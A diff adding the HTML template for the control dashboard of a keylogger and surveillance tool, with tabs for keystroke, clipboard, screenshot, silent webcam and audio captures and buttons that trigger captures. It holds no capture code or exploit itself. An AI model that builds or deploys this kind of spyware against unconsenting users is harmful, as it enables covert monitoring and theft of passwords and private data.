@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Advanced Keylogger & Intelligence Suite | Avi</title>
+    <!-- Google Fonts & Font Awesome Icons -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+</head>
+<body>
+    <div class="app-container">
+        <!-- Sidebar Navigation -->
+        <aside class="sidebar">
+            <div class="brand">
+                <div class="logo-icon">
+                    <i class="fa-solid fa-shield-halved"></i>
+                </div>
+                <div class="brand-text">
+                    <h2>KeyLogger<span>.AI</span></h2>
+                    <span class="author-badge"><i class="fa-solid fa-code"></i> By {{ author }}</span>
+                </div>
+            </div>
+
+            <nav class="nav-menu">
+                <button class="nav-item active" data-tab="overview">
+                    <i class="fa-solid fa-chart-pie"></i> Overview
+                </button>
+                <button class="nav-item" data-tab="keystrokes">
+                    <i class="fa-solid fa-keyboard"></i> Keystrokes Log
+                </button>
+                <button class="nav-item" data-tab="screenshots">
+                    <i class="fa-solid fa-desktop"></i> Screenshots
+                </button>
+                <button class="nav-item" data-tab="webcam">
+                    <i class="fa-solid fa-camera"></i> WebCamera Snaps
+                </button>
+                <button class="nav-item" data-tab="clipboard">
+                    <i class="fa-solid fa-paste"></i> Clipboard Log
+                </button>
+                <button class="nav-item" data-tab="system">
+                    <i class="fa-solid fa-microchip"></i> System Info
+                </button>
+            </nav>
+
+            <div class="status-card">
+                <div class="status-indicator active" id="engine-status-dot"></div>
+                <div class="status-info">
+                    <span class="status-title">Engine Status</span>
+                    <span class="status-value" id="engine-status-text">Active</span>
+                </div>
+            </div>
+        </aside>
+
+        <!-- Main Content Area -->
+        <main class="main-content">
+            <!-- Header -->
+            <header class="top-header">
+                <div class="page-title">
+                    <h1 id="header-title">Dashboard Overview</h1>
+                    <p class="subtitle">Real-time system monitoring & intelligence capture</p>
+                </div>
+                <div class="header-controls">
+                    <button class="btn btn-outline" id="btn-refresh">
+                        <i class="fa-solid fa-rotate-right"></i> Refresh
+                    </button>
+                    <div class="active-window-pill">
+                        <i class="fa-solid fa-window-maximize"></i>
+                        <span id="active-window-text">Tracking Active Window...</span>
+                    </div>
+                </div>
+            </header>
+
+            <!-- Tab 1: Overview -->
+            <section class="tab-content active" id="tab-overview">
+                <!-- Metrics Grid -->
+                <div class="metrics-grid">
+                    <div class="metric-card">
+                        <div class="card-icon cyan"><i class="fa-solid fa-font"></i></div>
+                        <div class="card-data">
+                            <span class="card-label">Total Keystrokes</span>
+                            <h3 id="stat-keystrokes">0</h3>
+                        </div>
+                    </div>
+                    <div class="metric-card">
+                        <div class="card-icon purple"><i class="fa-solid fa-image"></i></div>
+                        <div class="card-data">
+                            <span class="card-label">Screenshots</span>
+                            <h3 id="stat-screenshots">0</h3>
+                        </div>
+                    </div>
+                    <div class="metric-card">
+                        <div class="card-icon emerald"><i class="fa-solid fa-camera-retro"></i></div>
+                        <div class="card-data">
+                            <span class="card-label">Webcam Snaps</span>
+                            <h3 id="stat-webcam">0</h3>
+                        </div>
+                    </div>
+                    <div class="metric-card">
+                        <div class="card-icon amber"><i class="fa-solid fa-microphone"></i></div>
+                        <div class="card-data">
+                            <span class="card-label">Audio Clips</span>
+                            <h3 id="stat-audio">0</h3>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Quick Action Panel -->
+                <div class="quick-actions-box">
+                    <h3><i class="fa-solid fa-bolt"></i> Instant Trigger Actions</h3>
+                    <div class="action-buttons">
+                        <button class="btn btn-action" id="trigger-screenshot">
+                            <i class="fa-solid fa-camera"></i> Screen Snap
+                        </button>
+                        <button class="btn btn-action" id="trigger-webcam">
+                            <i class="fa-solid fa-video"></i> WebCam Snap
+                        </button>
+                        <button class="btn btn-action" id="trigger-audio">
+                            <i class="fa-solid fa-microphone-lines"></i> Record 10s Audio
+                        </button>
+                        <button class="btn btn-action btn-danger" id="trigger-encrypt">
+                            <i class="fa-solid fa-lock"></i> Encrypt Logs
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Live Keystroke Snippet & System Overview -->
+                <div class="dashboard-split-grid">
+                    <div class="panel-card">
+                        <div class="panel-header">
+                            <h3><i class="fa-solid fa-terminal"></i> Recent Keystrokes</h3>
+                        </div>
+                        <pre class="code-preview" id="recent-keys-preview">Loading logs...</pre>
+                    </div>
+                    <div class="panel-card">
+                        <div class="panel-header">
+                            <h3><i class="fa-solid fa-clipboard-list"></i> Latest Clipboard Data</h3>
+                        </div>
+                        <pre class="code-preview" id="recent-clipboard-preview">No clipboard data...</pre>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Tab 2: Keystrokes -->
+            <section class="tab-content" id="tab-keystrokes">
+                <div class="panel-card full-height">
+                    <div class="panel-header search-bar-header">
+                        <h3><i class="fa-solid fa-keyboard"></i> Active Window Keystroke Stream</h3>
+                        <input type="text" id="search-keystrokes" class="search-input" placeholder="Search keystrokes or window title...">
+                    </div>
+                    <div class="log-container">
+                        <pre id="full-keystrokes-log" class="terminal-log">Loading keystrokes...</pre>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Tab 3: Screenshots -->
+            <section class="tab-content" id="tab-screenshots">
+                <div class="panel-card full-height">
+                    <div class="panel-header">
+                        <h3><i class="fa-solid fa-desktop"></i> Captured Screenshots</h3>
+                    </div>
+                    <div class="gallery-grid" id="screenshots-gallery">
+                        <p class="empty-msg">No screenshots available.</p>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Tab 4: WebCam -->
+            <section class="tab-content" id="tab-webcam">
+                <div class="panel-card full-height">
+                    <div class="panel-header">
+                        <h3><i class="fa-solid fa-camera"></i> Silent WebCamera Snaps</h3>
+                    </div>
+                    <div class="gallery-grid" id="webcam-gallery">
+                        <p class="empty-msg">No webcam snaps available.</p>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Tab 5: Clipboard -->
+            <section class="tab-content" id="tab-clipboard">
+                <div class="panel-card full-height">
+                    <div class="panel-header">
+                        <h3><i class="fa-solid fa-paste"></i> Clipboard History</h3>
+                    </div>
+                    <div class="log-container">
+                        <pre id="full-clipboard-log" class="terminal-log">Loading clipboard logs...</pre>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Tab 6: System Info -->
+            <section class="tab-content" id="tab-system">
+                <div class="panel-card full-height">
+                    <div class="panel-header">
+                        <h3><i class="fa-solid fa-microchip"></i> System Hardware & Network Diagnostics</h3>
+                    </div>
+                    <div class="log-container">
+                        <pre id="full-system-info" class="terminal-log">Loading system diagnostic info...</pre>
+                    </div>
+                </div>
+            </section>
+        </main>
+    </div>
+
+    <!-- Image Modal Lightbox -->
+    <div class="modal" id="image-modal">
+        <div class="modal-overlay"></div>
+        <div class="modal-content">
+            <button class="modal-close" id="modal-close"><i class="fa-solid fa-xmark"></i></button>
+            <img id="modal-img" src="" alt="Media Preview">
+            <span id="modal-caption" class="modal-caption"></span>
+        </div>
+    </div>
+
+    <script src="{{ url_for('static', filename='js/dashboard.js') }}"></script>
+</body>
+</html>
